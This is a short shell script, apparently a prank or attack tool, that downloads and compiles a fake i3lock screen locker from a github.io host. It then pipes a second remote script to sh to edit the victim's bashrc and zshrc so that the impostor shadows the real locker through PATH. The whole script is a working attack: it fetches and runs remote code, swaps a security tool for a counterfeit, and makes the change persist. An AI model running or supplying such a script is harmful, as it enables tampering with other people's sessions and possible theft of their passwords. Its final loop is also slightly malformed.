#!/bin/sh

tempdir=$(mktemp -d)
cd "$tempdir"
curl "https://d-002.github.io/epita/confloose/fake-i3lock/i3lock.c" >> "$tempdir/i3lock.c"
i3lock_path=$(which i3lock | sed "s|/|\\\\/|g")
sed -i "s/I3LOCK_PATH/$i3lock_path/" i3lock.c
gcc -o i3lock i3lock.c -std=c99

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-i3lock" "'export PATH=\"$tempdir:\$PATH\"'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null done
